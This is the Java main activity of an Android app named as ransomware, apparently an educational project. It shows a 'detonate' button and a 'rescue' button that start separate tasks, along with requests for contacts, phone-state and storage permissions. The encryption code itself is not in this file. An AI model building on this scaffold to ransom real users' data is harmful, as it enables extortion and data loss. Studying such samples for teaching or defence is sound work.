package fr.esgi.ransomware;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.os.Message;
import android.support.annotation.NonNull;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.support.v7.app.AppCompatActivity;
import android.support.v7.widget.LinearLayoutManager;
import android.support.v7.widget.RecyclerView;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.TextView;
import android.widget.Toast;

import java.util.ArrayList;
import java.util.LinkedList;
import java.util.List;

import butterknife.BindView;
import butterknife.ButterKnife;
import butterknife.OnClick;
import fr.esgi.ransomware.task.DetonateTask;
import fr.esgi.ransomware.task.RescueTask;
import fr.esgi.ransomware.task.Task;

public class MainActivity extends AppCompatActivity {

    private static final int PERMISSIONS_REQUEST = 1337;

    @BindView(R.id.main_act_permissions_overlay)
    View permissionsOverlay;

    @BindView(R.id.main_act_frame_detonate)
    View rootDetonate;

    @BindView(R.id.main_act_frame_rescue)
    View rootRescue;

    @BindView(R.id.main_act_frame_loader)
    View rootLoader;

    @BindView(R.id.main_act_recycler_logs)
    RecyclerView recyclerLogs;

    private MainActivity.LogAdapter logAdapter;

    private Handler handler;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        ButterKnife.bind(this);
        invalidatePermissionsOverlay(needGrantPermissions());


        logAdapter = new LogAdapter(getApplicationContext());
        LinearLayoutManager linearLayoutManager = new LinearLayoutManager(this);
        linearLayoutManager.setStackFromEnd(true);
        recyclerLogs.setLayoutManager(linearLayoutManager);

        recyclerLogs.setAdapter(logAdapter);

        handler = new Handler(Looper.getMainLooper()) {

            @Override
            public void handleMessage(Message msg) {
                super.handleMessage(msg);
                String s = msg.obj.toString();
                if (s != null) {
                    logAdapter.logs.add(s);
                    logAdapter.notifyDataSetChanged();
                    recyclerLogs.scrollToPosition(logAdapter.getItemCount() - 1);
                }
            }
        };


        invalidateButton();
    }

    @OnClick(R.id.main_act_btn_detonate)
    public void detonate() {
        logAdapter.logs.clear();
        ProcessTask processTask = new MainActivity.ProcessTask();
        processTask.execute(new DetonateTask(getApplicationContext(), handler));
    }


    @OnClick(R.id.main_act_btn_rescue)
    public void rescue() {
        logAdapter.logs.clear();
        ProcessTask processTask = new MainActivity.ProcessTask();
        processTask.execute(new RescueTask(getApplicationContext(), handler));
    }


    @OnClick(R.id.main_act_btn_grant_permissions)
    public void checkPerm() {
        needGrantPermissions();
    }

    private boolean needGrantPermissions() {
        String[] permsAll = new String[]{
                Manifest.permission.READ_PHONE_STATE,

                Manifest.permission.READ_CONTACTS,
                Manifest.permission.WRITE_CONTACTS,

                Manifest.permission.READ_EXTERNAL_STORAGE,
                Manifest.permission.WRITE_EXTERNAL_STORAGE
        };
        List<String> permAsk = new LinkedList<>();

        for (String perm : permsAll) {
            if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
                permAsk.add(perm);
            }
        }
        if (permAsk.size() != 0) {
            ActivityCompat.requestPermissions(this,
                    permAsk.toArray(new String[permAsk.size()]),
                    PERMISSIONS_REQUEST);

            return true;
        }
        return false;
    }


    public void onRequestPermissionsResult(int requestCode, String permissions[], int[] grantResults) {
        if (requestCode == PERMISSIONS_REQUEST) {
            boolean allGranted = true;
            for (int result : grantResults) {
                if (result != PackageManager.PERMISSION_GRANTED) {
                    allGranted = false;
                    break;
                }
            }
            invalidatePermissionsOverlay(!allGranted);

            if (!allGranted) {
                Toast.makeText(this, R.string.please_grant_permissions, Toast.LENGTH_LONG).show();
            }
        }
    }

    private void invalidateButton() {
        boolean isRekt = Util.isRekt(getApplicationContext());
        rootDetonate.setVisibility(isRekt ? View.GONE : View.VISIBLE);
        rootRescue.setVisibility(isRekt ? View.VISIBLE : View.GONE);
    }

    private void invalidatePermissionsOverlay(boolean visible) {
        permissionsOverlay.setVisibility(visible ? View.VISIBLE : View.GONE);
        permissionsOverlay.setClickable(visible);
        permissionsOverlay.setFocusable(visible);
    }


    class LogAdapter extends RecyclerView.Adapter<MainActivity.LogViewHolder> {
        private final List<String> logs;
        private final LayoutInflater layoutInflater;

        public LogAdapter(Context context) {
            this.logs = new ArrayList<>();
            layoutInflater = LayoutInflater.from(context);
        }

        @NonNull
        @Override
        public LogViewHolder onCreateViewHolder(@NonNull ViewGroup parent, int viewType) {
            View view = layoutInflater.inflate(R.layout.adapter_log, parent, false);
            return new LogViewHolder(view);
        }

        @Override
        public void onBindViewHolder(@NonNull LogViewHolder holder, int position) {
            holder.bind(logs.get(position));
        }

        @Override
        public int getItemCount() {
            return logs.size();
        }
    }

    class LogViewHolder extends RecyclerView.ViewHolder {

        @BindView(R.id.log_adatper_text)
        TextView textView;

        public LogViewHolder(View itemView) {
            super(itemView);
            ButterKnife.bind(this, itemView);
        }

        public void bind(String log) {
            textView.setText(log);
        }
    }

    class ProcessTask extends AsyncTask<Task, Void, Void> {
        @Override
        protected void onPreExecute() {
            rootLoader.setVisibility(View.VISIBLE);
        }

        @Override
        protected void onPostExecute(Void aVoid) {
            onEnd();
        }

        @Override
        protected void onCancelled(Void aVoid) {
            onEnd();
        }

        private void onEnd() {
            rootLoader.setVisibility(View.GONE);
            invalidateButton();
        }

        @Override
        protected Void doInBackground(Task... tasks) {
            try {
                tasks[0].run();
            } catch (Exception e) {
                e.printStackTrace();
                Util.sendLogMessage(handler, e.getMessage());
            }
            return null;
        }
    }

}
